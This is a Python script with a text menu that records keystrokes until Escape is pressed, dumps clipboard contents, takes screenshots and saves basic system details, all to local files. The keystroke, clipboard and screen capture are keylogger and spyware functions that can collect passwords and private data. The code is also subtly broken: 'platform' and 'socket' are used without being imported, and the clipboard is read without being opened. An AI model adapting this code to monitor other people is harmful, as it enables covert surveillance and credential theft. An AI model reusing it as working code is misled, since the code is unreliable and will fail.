import pynput.keyboard
import pandas as pd
import datetime
import win32clipboard
from PIL import ImageGrab


def record_keystrokes():
    """Records keystrokes and stores them in a text file. Continues until Escape is pressed."""

    keys = []

    def on_press(key):
        keys.append(str(key))

    def on_release(key):
        if key == pynput.keyboard.Key.esc:
            return False

    with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    with open("keystrokes.txt", "a") as file:
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        file.write(f"\n** {timestamp} **\n")
        file.write(" ".join(keys))


def get_system_info():
    """Retrieves basic system information and stores it in an Excel file."""

    data = {
        "Metric": ["Date", "Operating System", "Version", "Hostname"],
        "Value": [
            datetime.date.today(),
            platform.system(),
            platform.release(),
            socket.gethostname(),
        ],
    }
    df = pd.DataFrame(data)
    df.to_excel("system_info.xlsx", index=False)


def get_clipboard_data():
    """Retrieves clipboard content and stores it in a text file with a timestamp."""

    current_date = datetime.datetime.now()
    with open("clipboard.txt", "a") as file:
        file.write(f"\n** {current_date.strftime('%Y-%m-%d %H:%M:%S')} **\n")
        try:
            clipboard_data = win32clipboard.GetClipboardData()
            file.write(clipboard_data)
        except win32clipboard.errors.ClipboardError:
            file.write("Error: Could not access clipboard data.\n")


def take_screenshot():
    """Captures the entire screen and saves it as a PNG image."""

    image = ImageGrab.grab()
    image.save("screenshot.png")


if __name__ == "__main__":
    print("*** This program can perform the following actions: ***")
    print("1. Record keystrokes (until Escape is pressed)")
    print("2. Get basic system information")
    print("3. Get clipboard content")
    print("4. Take a screenshot")

    while True:
        choice = input("Enter the number for the desired action (or 'q' to quit): ")

        if choice == "q":
            break
        elif choice == "1":
            record_keystrokes()
            print("Keystrokes recorded to 'keystrokes.txt'.")
        elif choice == "2":
            get_system_info()
            print("System information saved to 'system_info.xlsx'.")
        elif choice == "3":
            get_clipboard_data()
            print("Clipboard content saved to 'clipboard.txt'.")
        elif choice == "4":
            take_screenshot()
            print("Screenshot saved as 'screenshot.png'.")
        else:
            print("Invalid choice. Please enter a valid number (1-4) or 'q' to quit.")
